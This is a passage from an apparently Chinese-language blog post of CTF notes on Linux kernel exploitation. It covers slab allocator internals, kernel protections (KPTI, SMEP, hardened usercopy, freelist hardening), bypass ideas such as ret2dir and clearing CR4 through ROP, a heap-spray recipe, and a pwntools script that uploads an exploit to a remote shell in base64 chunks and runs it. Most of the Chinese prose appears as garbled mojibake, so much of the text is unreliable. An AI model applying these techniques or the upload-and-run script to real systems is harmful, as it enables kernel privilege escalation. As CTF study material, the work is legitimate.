href="https://elixir.bootlin.com/linux/latest/source/tools/vm/slabinfo.c">kernel source</a> that can print the aliasing information in a nicer format (i.e., <code>slabinfo -a</code>) by parsing <code>/sys/kernel/slabinfo</code>.</p><h3 id="æŸ¥çœ‹slab"><a href="#æŸ¥çœ‹slab" class="headerlink" title="æŸ¥çœ‹slab"></a>æŸ¥çœ‹slab</h3><p><code>kmem_cache</code>æ˜¯ç±»ä¼¼äºglibc arenaçš„ç»“æ„ï¼Œæ¯ä¸ª<code>kmem_cache</code>ç”±è‹¥å¹²ä¸ªslabæ„æˆï¼Œæ¯ä¸ªslabç”±ä¸€ä¸ªæˆ–å¤šä¸ªè¿ç»­çš„é¡µç»„æˆã€‚<code>kmem_cache</code>æœ‰ä¸€ä¸ªé‡è¦çš„æ€§è´¨ï¼Œå°±æ˜¯å…¶ä¸­æ‰€æœ‰çš„objectå¤§å°éƒ½æ˜¯ç›¸åŒçš„ï¼ˆå‡†ç¡®çš„è¯´æ˜¯åˆ†é…å—çš„å¤§å°éƒ½ç›¸åŒ). </p><p>æˆ‘ä»¬å€ŸåŠ©linuxçš„ <code>/proc/slabinfo</code> æ¥è¯´æ˜ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ <code>slabtop</code> å·¥å…·æ¥æŸ¥çœ‹slabåˆ†é…çš„çŠ¶æ€ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cat /proc/slabinfo</span><br><span class="hljs-meta">#</span><span class="bash"> name            &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; : tunables &lt;<span class="hljs-built_in">limit</span>&gt; &lt;batchcount&gt; &lt;sharedfactor&gt; : slabdata &lt;active_slabs&gt; &lt;num_slabs&gt; &lt;sharedavail&gt;</span><br>...<br>task_struct         1194   1287   8576    3    8 : tunables    0    0    0 : slabdata    429    429      0<br>cred_jar            8665  11088    192   42    2 : tunables    0    0    0 : slabdata    264    264      0<br>...<br>kmalloc-8192         498    532   8192    4    8 : tunables    0    0    0 : slabdata    133    133      0<br>kmalloc-4096         697    776   4096    8    8 : tunables    0    0    0 : slabdata     97     97      0<br>kmalloc-2048        2954   3088   2048   16    8 : tunables    0    0    0 : slabdata    193    193      0<br>kmalloc-1024        8494   8960   1024   32    8 : tunables    0    0    0 : slabdata    280    280      0<br>kmalloc-512         6414   6624    512   32    4 : tunables    0    0    0 : slabdata    207    207      0<br>kmalloc-256         3021   3936    256   32    2 : tunables    0    0    0 : slabdata    123    123      0<br>kmalloc-192         7152   7350    192   42    2 : tunables    0    0    0 : slabdata    175    175      0<br>kmalloc-128        21357  23712    128   32    1 : tunables    0    0    0 : slabdata    741    741      0<br>kmalloc-96         11669  25158     96   42    1 : tunables    0    0    0 : slabdata    599    599      0<br>kmalloc-64         40682  47808     64   64    1 : tunables    0    0    0 : slabdata    747    747      0<br>kmalloc-32         22528  22528     32  128    1 : tunables    0    0    0 : slabdata    176    176      0<br>kmalloc-16         12032  12032     16  256    1 : tunables    0    0    0 : slabdata     47     47      0<br>kmalloc-8          10240  10240      8  512    1 : tunables    0    0    0 : slabdata     20     20      0<br>kmem_cache_node      512    512     64   64    1 : tunables    0    0    0 : slabdata      8      8      0<br>kmem_cache           250    250    320   25    2 : tunables    0    0    0 : slabdata     10     10      0<br></code></pre></div></td></tr></table></figure><p>è¿™ä¸ªæ–‡ä»¶åˆ—å‡ºäº†ç›®å‰æ‰€æœ‰çš„ <code>kmem_cache</code>ï¼Œç¬¬ä¸€åˆ—æ˜¯æ¯ä¸ªmem_cacheçš„åå­—ï¼Œæˆ‘ä»¬æ‹¿ <code>kmalloc-64</code> æ¥åšè¯´æ˜</p><ul><li>active_objs: ç›®å‰ä½¿ç”¨ä¸­çš„objectæ•°é‡ï¼Œä¸€å…±åˆ†é…å‡ºäº†40682ä¸ªobjects.</li><li>num_objs: æ€»å…±èƒ½å¤Ÿåˆ†é…çš„objectæ•°é‡ï¼Œè¿™é‡Œæœ€å¤§æ˜¯47808ä¸ª.</li><li>objsize: æ¯ä¸ªobjectçš„å¤§å°ï¼Œè¿™é‡Œæ˜¯64 bytes.</li><li>objperslab: æ¯ä¸ªslabå¯ä»¥æœ‰å¤šå°‘ä¸ªobjectï¼Œè¿™é‡Œæ˜¯64ä¸ª.</li><li>pagesperslab: æ¯ä¸ªslabå¯¹åº”å‡ ä¸ªpageï¼Œè¿™é‡Œæ˜¯1ä¸ª.</li></ul><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œ<code>kmalloc-64</code> è¿™ä¸ªmem_cacheï¼Œæ¯ä¸ªslabæœ‰1ä¸ªpageä¹Ÿå°±æ˜¯4Kï¼Œæ¯ä¸ªå¯¹è±¡æ˜¯64Bï¼Œæ‰€ä»¥æ¯ä¸ªslabèƒ½å®¹çº³çš„å¯¹è±¡æ˜¯ <code>4K / 64B = 64</code> ä¸ª. å¦‚æœåˆ†é…äº†objectæ•°é‡è¶…è¿‡äº†64ä¸ªï¼Œå°±éœ€è¦ä»åˆ«çš„slabåˆ†é…ï¼Œå¦‚æœåˆ†é…çš„å¯¹è±¡è¶…è¿‡äº†47808ä¸ªï¼Œå°±éœ€è¦ç”³è¯·æ–°çš„slabï¼Œä¹Ÿå°±æ˜¯å‘buddy systemç”³è¯·æ–°çš„å†…å­˜é¡µ.</p><h3 id="ç›¸å…³API"><a href="#ç›¸å…³API" class="headerlink" title="ç›¸å…³API"></a>ç›¸å…³API</h3><p>Linuxä¸­çš„ä¸€äº›å¸¸ç”¨å†…æ ¸API.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">struct kmem_cache * <span class="hljs-title">kmem_cache_create</span> <span class="hljs-params">(    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name,</span></span><br><span class="hljs-params"><span class="hljs-function">     <span class="hljs-keyword">size_t</span>      size,</span></span><br><span class="hljs-params"><span class="hljs-function">     <span class="hljs-keyword">size_t</span>      align,</span></span><br><span class="hljs-params"><span class="hljs-function">     <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>      flags,</span></span><br><span class="hljs-params"><span class="hljs-function">     <span class="hljs-keyword">void</span> (*ctor(<span class="hljs-keyword">void</span>*, struct kmem_cache *, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>),</span></span><br><span class="hljs-params"><span class="hljs-function">     <span class="hljs-keyword">void</span> (*dtor(<span class="hljs-keyword">void</span>*, struct kmem_cache *, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>));</span></span><br></code></pre></div></td></tr></table></figure><p>åˆ›å»ºmem_cacheï¼Œéœ€è¦æŒ‡å®šnameå’Œsize.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> * <span class="hljs-title">kmem_cache_alloc</span> <span class="hljs-params">(struct kmem_cache * cachep, <span class="hljs-keyword">gfp_t</span> flags)</span></span>;<br></code></pre></div></td></tr></table></figure><p>åœ¨mem_cacheä¸­åˆ†é…objectï¼Œè¿™é‡Œä¸éœ€è¦æŒ‡å®šsizeå› ä¸ºåœ¨åˆ›å»ºæ—¶å°±å·²ç»æŒ‡å®šå¥½äº†.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">kmem_cache_free</span> <span class="hljs-params">(struct kmem_cache * cachep, <span class="hljs-keyword">void</span> * objp)</span></span>;<br></code></pre></div></td></tr></table></figure><p>åœ¨mem_cacheä¸­é‡Šæ”¾object.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> * <span class="hljs-title">kmalloc</span> <span class="hljs-params">(<span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">gfp_t</span> flags)</span></span>;<br></code></pre></div></td></tr></table></figure><p>åˆ†é…sizeå¤§å°çš„å¯¹è±¡ï¼Œä¼šåœ¨ <code>kmalloc-xxx</code> è¿™äº›ç‰¹æ®Šçš„mem_cacheé‡Œæ‰¾åˆ°ä¸€ä¸ªé€‚åˆçš„è¿›è¡Œåˆ†é…. <strong>å‘2^n^å¤§å°å¾€ä¸Šå¯¹é½</strong>.<br>å¦‚æœsizeè¶…è¿‡äº†æœ€å¤§çš„kmalloc mem_cacheï¼Œæ¯”å¦‚ä¸Šé¢é‚£ä¸ªslabinfoé‡Œæœ€å¤§çš„æ˜¯ <code>kmalloc-8192</code>ï¼Œå¦‚æœåˆ†é…è¶…è¿‡8192 bytesçš„è¯ï¼Œè¿˜æ˜¯ä¼šè°ƒç”¨åº•å±‚APIç›´æ¥å‘buddyç”³è¯·å†…å­˜. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">kfree</span> <span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> * objp)</span></span>;<br></code></pre></div></td></tr></table></figure><p>é‡Šæ”¾å¯¹è±¡ <code>objp</code> ï¼Œå®é™…ä¼šå…ˆæ‰¾åˆ°å…¶æ‰€åœ¨çš„pageï¼Œç„¶åè¯»å–pageç»“æ„ä¸­æŒ‡å‘å…¶æ‰€å±slabçš„æŒ‡é’ˆï¼Œè¿›è€Œæ”¾åˆ°å¯¹åº”çš„freelistï¼ˆå•é“¾è¡¨ï¼‰ä¸­ï¼Œå¹¶å°†æŒ‡å‘freelistä¸­ä¸‹ä¸€å—çš„fdæŒ‡é’ˆå†™åˆ°å—çš„å¤´éƒ¨.</p><h2 id="ä¿æŠ¤æœºåˆ¶"><a href="#ä¿æŠ¤æœºåˆ¶" class="headerlink" title="ä¿æŠ¤æœºåˆ¶"></a>ä¿æŠ¤æœºåˆ¶</h2><h3 id="ä¸€-é€šç”¨ä¿æŠ¤æœºåˆ¶"><a href="#ä¸€-é€šç”¨ä¿æŠ¤æœºåˆ¶" class="headerlink" title="ä¸€. é€šç”¨ä¿æŠ¤æœºåˆ¶"></a>ä¸€. é€šç”¨ä¿æŠ¤æœºåˆ¶</h3><blockquote><p>KASLR FGASLR SMAP SMEP KPTI(ä»è½¯ä»¶å±‚é¢ä¿®å¤äº† Meltdown æ¼æ´) </p><p>STACK PROTECTOR </p></blockquote><p>KPTIå¯ç”¨æ˜¯è¿”å›ç”¨æˆ·æ€ä¼šå¯¼è‡´segmentation faultï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥<strong>æŠŠåŸæ¥çš„è¿”å›åœ°å€ getRootShell å‡½æ•°è®¾ä¸º SIGSEGV ä¿¡å·çš„å¤„ç†å‡½æ•°</strong>ï¼Œè¿™æ ·åŸå…ˆçš„ <code>swapgs ; iretq</code> çš„æ–¹æ³•å°±å¯ä»¥ç»§ç»­ç”¨äº†</p><p>SMEPä¿æŠ¤çš„ç»•è¿‡æœ‰ä»¥ä¸‹ä¸¤ç§æ–¹å¼ï¼š</p><ul><li>åˆ©ç”¨<strong>å†…æ ¸çº¿æ€§æ˜ å°„åŒº</strong>(åº”è¯¥æ˜¯æŒ‡å†…æ ¸è™šå€ç©ºé—´åœ¨ç‰©ç†ä¸Šä¹Ÿæ˜¯è¿ç»­çš„)å¯¹ç‰©ç†åœ°å€ç©ºé—´çš„å®Œæ•´æ˜ å°„ï¼Œæ‰¾åˆ°ç”¨æˆ·ç©ºé—´å¯¹åº”é¡µæ¡†çš„å†…æ ¸ç©ºé—´åœ°å€ï¼Œåˆ©ç”¨è¯¥å†…æ ¸åœ°å€å®Œæˆå¯¹ç”¨æˆ·ç©ºé—´çš„è®¿é—®ï¼ˆå³ä¸€ä¸ªå†…æ ¸ç©ºé—´åœ°å€ä¸ä¸€ä¸ªç”¨æˆ·ç©ºé—´åœ°å€æ˜ å°„åˆ°äº†åŒä¸€ä¸ªé¡µæ¡†ä¸Šï¼‰ï¼Œè¿™ç§æ”»å‡»æ‰‹æ³•ç§°ä¸º <strong>ret2dir</strong> æ˜¯æˆ‘è¿˜æ²¡æœ‰è§è¿‡çš„æ–¹å¼</li><li>Intelä¸‹ç³»ç»Ÿæ ¹æ®CR4æ§åˆ¶å¯„å­˜å™¨çš„ç¬¬20ä½æ ‡è¯†æ˜¯å¦å¼€å¯SMEPä¿æŠ¤ï¼ˆ1ä¸ºå¼€å¯ï¼Œ0ä¸ºå…³é—­ï¼‰ï¼Œè‹¥æ˜¯èƒ½å¤Ÿé€šè¿‡kernel ROPæ”¹å˜CR4å¯„å­˜å™¨çš„å€¼ä¾¿èƒ½å¤Ÿå…³é—­SMEPä¿æŠ¤ï¼Œå®ŒæˆSMEP-bypassï¼Œæ¥ä¸‹æ¥å°±èƒ½å¤Ÿé‡æ–°è¿›è¡Œ ret2usrï¼Œ<strong>ä½†å¯¹äºå¼€å¯äº† KPTI çš„å†…æ ¸è€Œè¨€ï¼Œå†…æ ¸é¡µè¡¨çš„ç”¨æˆ·åœ°å€ç©ºé—´æ— æ‰§è¡Œæƒé™ï¼Œè¿™ä½¿å¾— ret2usr å½»åº•æˆä¸ºè¿‡å»å¼</strong> </li><li>å½“ä¸‹é¢è¿™ä¸ªå¯ç”¨æ—¶modeprobeæ–¹æ³•å°±ä¸ç®¡ç”¨äº†(æ‚²). </li></ul><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">CONFIG_STATIC_USERMODEHELPER</span>=y<br><span class="hljs-attr">CONFIG_STATIC_USERMODEHELPER_PATH</span>=<span class="hljs-string">&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><h3 id="äºŒ-å†…æ ¸â€œå †â€ä¸Šä¿æŠ¤æœºåˆ¶"><a href="#äºŒ-å†…æ ¸â€œå †â€ä¸Šä¿æŠ¤æœºåˆ¶" class="headerlink" title="äºŒ. å†…æ ¸â€œå †â€ä¸Šä¿æŠ¤æœºåˆ¶"></a>äºŒ. å†…æ ¸â€œå †â€ä¸Šä¿æŠ¤æœºåˆ¶</h3><blockquote><p>more info å¯ä»¥å‚è€ƒ<a href="https://duasynt.com/blog/linux-kernel-heap-feng-shui-2022">è¿™é‡Œ</a></p></blockquote><h4 id="Hardened-Usercopy"><a href="#Hardened-Usercopy" class="headerlink" title="Hardened Usercopy"></a>Hardened Usercopy</h4><p>hardened usercopy æ˜¯ç”¨ä»¥åœ¨ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´ä¹‹é—´æ‹·è´æ•°æ®æ—¶è¿›è¡Œè¶Šç•Œæ£€æŸ¥çš„ä¸€ç§é˜²æŠ¤æœºåˆ¶ï¼Œ<strong>ä¸»è¦æ£€æŸ¥æ‹·è´è¿‡ç¨‹ä¸­å¯¹å†…æ ¸ç©ºé—´ä¸­æ•°æ®çš„è¯»å†™æ˜¯å¦ä¼šè¶Šç•Œ</strong>. è¿™ä¸€ä¿æŠ¤è¢«ç”¨äº <code>copy_to_user()</code> ä¸ <code>copy_from_user()</code> ç­‰æ•°æ®äº¤æ¢ API ä¸­, åœ¨4.16ä»¥å‰çš„(éƒ¨åˆ†)<a href="https://lwn.net/Articles/695991/">æ–¹æ³•</a>æ˜¯:</p><ul><li>åœ¨æ ˆä¸Šcopyå°±æ£€æŸ¥æ˜¯å¦åœ¨å½“å‰æ ˆå¸§, </li><li>åœ¨slabä¸Šçš„copyå°±æ£€æŸ¥æ˜¯å¦åœ¨objectèŒƒå›´å†…. </li></ul><p>è€Œåœ¨4.16(2018å¹´)ä¹‹ååˆæ·»åŠ äº† <code>useroffset</code> <code>usersize</code> ä¸¤ä¸ªå˜é‡åˆ° <code>keme_cache</code> ä¸­, ç”¨ä»¥æ ‡æ˜objectä¸­ç”¨æˆ·å¯è®¿é—®çš„åŒºåŸŸ. è€Œgeneral cacheéƒ½ä¼šè¢«è®¾ç½®æˆoffset=0 size=object size. </p><p>è¿™æ ·çš„å‰¯ä½œç”¨æ˜¯å½“ä¸€ä¸ªcache is user accessible, è¿™ä¸ªcacheä¸èƒ½å’Œå…¶ä»–çš„cacheåˆå¹¶, å³ä½¿<code>CONFIG_HARDENED_USERCOPY</code>æ˜¯å…³é—­çš„ ! ä½†è¿˜å¯ä»¥ä½¿ç”¨slabçº§çš„spray. è¯¦è§<a href="#fuck">è¿™é‡Œ</a> </p><p>ä¸è¿‡è¿™ç§ä¿æŠ¤ <em>ä¸é€‚ç”¨äºå†…æ ¸ç©ºé—´å†…çš„æ•°æ®æ‹·è´</em> ï¼Œè¿™ä¹Ÿæ˜¯ç›®å‰ä¸»æµçš„ç»•è¿‡æ‰‹æ®µ, ä¾‹å¦‚RCTF2022ä¸­gameé¢„æœŸè§£, åˆ©ç”¨modify_ldtçš„å†…æ ¸ä¸­<code>memcpy()</code>. </p><h4 id="GFP-KERNEL-ACCOUNT"><a href="#GFP-KERNEL-ACCOUNT" class="headerlink" title="GFP_KERNEL_ACCOUNT"></a>GFP_KERNEL_ACCOUNT</h4><p>åœ¨5.9ä¹‹å‰, æœ‰ä¸¤ç§kmem_caches, one for system-wide and <strong>non-accounted allocations</strong> and the second one shared by all <strong>accounted allocations</strong>. è¿™æ—¶ä½¿ç”¨<code>GFP_KERNEL_ACCOUNT</code>åˆ†é…çš„cacheä¼šè¢«å½“åšç‹¬ç«‹çš„allocation. </p><p>è€Œ5.9å°†ä¸¤è€…åˆä¸€, åªåœ¨éœ€è¦çš„æ—¶å€™allocate obj_cgroup metadata, è¿™æ ·æ— è®ºobjæ˜¯å¦è¢«accountedéƒ½è§†ä½œåŒæ ·çš„cache. è¿™æ—¶æ— è®º<code>kmalloc</code>å¸¦æœ‰<code>GFP_KERNEL_ACCOUNT</code>æˆ–è€…<code>GFP_KERNEL</code>éƒ½å¯åˆ†é…ä¸ºåŒä¸€ä¸ªkmalloc-xxx. </p><p>ä½†æ˜¯åœ¨5.14ååˆæ²¡æ³•ç”¨äº†, å› ä¸ºobjcg pointer arrayå¯èƒ½å°±åœ¨è¦freeçš„slabå°¾éƒ¨, å¯¼è‡´é€’å½’freeæ ˆæº¢å‡º, äºæ˜¯å°†<code>kmalloc-&lt;n&gt; caches</code>åˆ†æˆä¸¤ç§, ä¸€ç§åªä½œä¸ºunaccounted, å¦ä¸€ç§ä½œä¸º<code>kmalloc-cg-&lt;n&gt;</code>. å…¶ä»–çš„cacheä»ç„¶ä½¿ç”¨æ··åˆä½“. </p><h4 id="Hardened-freelist"><a href="#Hardened-freelist" class="headerlink" title="Hardened freelist"></a>Hardened freelist</h4><p>é“¾æ¥ä¸­æ²¡æœ‰, <a href="https://rtfingc.github.io/slub-freelist-hardened">è¿™é‡Œ</a>æ˜¯å¸¦æºç çš„ä»‹ç». </p><p>ç±»ä¼¼äº glibc 2.32 ç‰ˆæœ¬å¼•å…¥çš„ä¿æŠ¤ï¼Œåœ¨å¼€å¯è¿™ç§ä¿æŠ¤ä¹‹å‰ï¼Œslub ä¸­çš„ free object çš„ next æŒ‡é’ˆç›´æ¥å­˜æ”¾ç€ next free object çš„åœ°å€ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è¯»å– freelist æ³„éœ²å‡ºå†…æ ¸çº¿æ€§æ˜ å°„åŒºçš„åœ°å€ï¼Œåœ¨å¼€å¯äº†è¯¥ä¿æŠ¤ä¹‹å free object çš„ next æŒ‡é’ˆå­˜æ”¾çš„æ˜¯ç”±ä»¥ä¸‹ä¸‰ä¸ªå€¼è¿›è¡Œå¼‚æˆ–æ“ä½œåçš„å€¼ï¼š</p><ul><li>å½“å‰ free object çš„åœ°å€</li><li>ä¸‹ä¸€ä¸ª free object çš„åœ°å€</li><li>ç”± kmem_cache æŒ‡å®šçš„ä¸€ä¸ª random å€¼</li></ul><p>æ”»å‡»è€…è‡³å°‘éœ€è¦è·å–åˆ°ç¬¬ä¸€ä¸ç¬¬ä¸‰ä¸ªå€¼æ‰èƒ½ç¯¡æ”¹ freelistï¼Œè¿™æ— ç–‘ä¸ºå¯¹ freelist çš„ç›´æ¥åˆ©ç”¨å¢æ·»ä¸å°‘éš¾åº¦</p><blockquote><p>åœ¨æ›´æ–°ç‰ˆæœ¬çš„ Linux kernel ä¸­ä¼¼ä¹è¿˜å¼•å…¥äº†ä¸€ä¸ªåç§»å€¼ï¼Œç¬”è€…å°šæœªè¿›è¡Œè€ƒè¯. </p><p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/mm/slab.c?id=2e6b3602168797fd4d80d86d208c4ba8fcfa3b8b">16å¹´</a>å¼•å…¥äº†. çœŸçš„å¤Ÿæ—©çš„. ä½†ä»…æ˜¯put the freelist at the end of slab page. </p></blockquote><h4 id="Random-freelist"><a href="#Random-freelist" class="headerlink" title="Random freelist"></a>Random freelist</h4><p>linux 4.8+: è¿™ç§ä¿æŠ¤ä¸»è¦å‘ç”Ÿåœ¨ slub allocator å‘ buddy system ç”³è¯·åˆ°é¡µæ¡†ä¹‹åçš„å¤„ç†è¿‡ç¨‹ä¸­ï¼Œå¯¹äºæœªå¼€å¯è¿™ç§ä¿æŠ¤çš„ä¸€å¼ å®Œæ•´çš„ slubï¼Œå…¶ä¸Šçš„ object çš„è¿æ¥é¡ºåºæ˜¯çº¿æ€§è¿ç»­çš„ï¼Œä½†åœ¨å¼€å¯äº†è¿™ç§ä¿æŠ¤ä¹‹åå…¶ä¸Šçš„ object ä¹‹é—´çš„è¿æ¥é¡ºåºæ˜¯éšæœºçš„ï¼Œè¿™è®©æ”»å‡»è€…æ— æ³•ç›´æ¥é¢„æµ‹ä¸‹ä¸€ä¸ªåˆ†é…çš„ object çš„åœ°å€</p><p>éœ€è¦æ³¨æ„çš„æ˜¯è¿™ç§ä¿æŠ¤å‘ç”Ÿåœ¨<strong>slub allocator åˆšä» buddy system æ‹¿åˆ°æ–° slub çš„æ—¶å€™ï¼Œè¿è¡Œæ—¶ freelist çš„æ„æˆä»éµå¾ª LIFO</strong> </p><p><a href="https://s2.loli.net/2022/03/11/wQzINfhXV3gpGxJ.png"><img src="https://s2.loli.net/2023/02/06/poheBnWDqAiV4z2.png" alt="image.png" style="zoom:67%;" /></a></p><p>a common technique to exploit heap overflows with freelist pointer randomisation enabled is to</p><ol><li>Exhaust the cache by allocating objects of the right size to fill in all partial slabs and start allocating new slabs.</li><li>Start filling in new slabs with target objects.</li><li>Free one target object and allocate the vulnerable object.</li><li>Perform the overflow and check which target object was modified.</li></ol><h3 id="ä¸‰-å…¶ä»–æœºåˆ¶"><a href="#ä¸‰-å…¶ä»–æœºåˆ¶" class="headerlink" title="ä¸‰. å…¶ä»–æœºåˆ¶"></a>ä¸‰. å…¶ä»–æœºåˆ¶</h3><p><a href="https://samsung.github.io/kspp-study/">https://samsung.github.io/kspp-study/</a> </p><h1 id="ç»ªè®º-kernel-pwn-tricks"><a href="#ç»ªè®º-kernel-pwn-tricks" class="headerlink" title="ç»ªè®º-kernel pwn tricks"></a>ç»ªè®º-kernel pwn tricks</h1><h2 id="æ–°ä¸œè¥¿"><a href="#æ–°ä¸œè¥¿" class="headerlink" title="æ–°ä¸œè¥¿"></a>æ–°ä¸œè¥¿</h2><ul><li>qemuçš„appendå‚æ•°æ˜¯ç»™å†…æ ¸æä¾›å‘½ä»¤è¡Œå‚æ•°ç”¨çš„, å…¶ä¸­<a href="https://www.kernel.org/doc/Documentation/admin-guide/kernel-parameters.txt">loglevel</a>è°ƒåˆ°6 7æ‰“å°å¤§éƒ¨åˆ†ä¿¡æ¯. é“¾æ¥å…¶ä½™éƒ¨åˆ†æ˜¯å¦å¤–çš„å‚æ•°, å¯ä»¥æŸ¥é˜…. </li><li></li></ul><h2 id="æ–‡ä»¶è¿œç¨‹ä¼ è¾“æ–¹å¼"><a href="#æ–‡ä»¶è¿œç¨‹ä¼ è¾“æ–¹å¼" class="headerlink" title="æ–‡ä»¶è¿œç¨‹ä¼ è¾“æ–¹å¼"></a>æ–‡ä»¶è¿œç¨‹ä¼ è¾“æ–¹å¼</h2><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œåœ¨CTFä¸­ä¸€ä¸ªç”¨ä½œ exploit çš„é™æ€ç¼–è¯‘çš„å¯æ‰§è¡Œæ–‡ä»¶çš„ä½“ç§¯é€šå¸¸å¯ä»¥è¾¾åˆ°æ•°ç™¾KBç”šè‡³å‡ Må¾€ä¸Šï¼Œæˆ‘ä»¬æ²¡æ³•å¾ˆæ–¹ä¾¿åœ°å°†å…¶ç›´æ¥ä¸Šä¼ åˆ°æœåŠ¡å™¨</p><p>ç›®å‰æ¥è¯´æ¯”è¾ƒé€šç”¨çš„åŠæ³•ä¾¿æ˜¯å°† exploit è¿›è¡Œ base64 ç¼–ç åä¼ è¾“ï¼Œå¯å‚è€ƒç¬”è€…æ‰€ç»™å‡ºçš„å¦‚ä¸‹è„šæœ¬ï¼š</p><blockquote><p>ç¬”è€…ä¼˜åŒ–åçš„æ‰“è¿œç¨‹ç”¨çš„è„šæœ¬. (å‡ºé¢˜ä¹Ÿç”¨114514çš„å±‘)</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./exp&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    exp = base64.b64encode(f.read())<br><br>p = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">114514</span>)<br><span class="hljs-comment">#p = process(&#x27;./run.sh&#x27;)</span><br>try_count = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p.sendline()<br>    p.recvuntil(<span class="hljs-string">&quot;/ $&quot;</span>)<br><br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(exp), <span class="hljs-number">0x200</span>):<br>        p.sendline(<span class="hljs-string">&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="hljs-number">0x200</span>].decode() + <span class="hljs-string">&quot;\&quot; &gt;&gt; /tmp/b64_exp&quot;</span>)<br>        count += <span class="hljs-number">1</span><br>        log.info(<span class="hljs-string">&quot;count: &quot;</span> + <span class="hljs-built_in">str</span>(count))<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(count):<br>        p.recvuntil(<span class="hljs-string">&quot;/ $&quot;</span>)<br><br>    p.sendline(<span class="hljs-string">&quot;cat /tmp/b64_exp | base64 -d &gt; /tmp/exploit&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;chmod +x /tmp/exploit&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;/tmp/exploit &quot;</span>)<br>    <span class="hljs-keyword">break</span><br><br>p.interactive()<br></code></pre></div></td></tr></table></figure><blockquote><p>ç¬”è€…æ—©æœŸå†™çš„æ‰“è¿œç¨‹ç”¨çš„è„šæœ¬</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 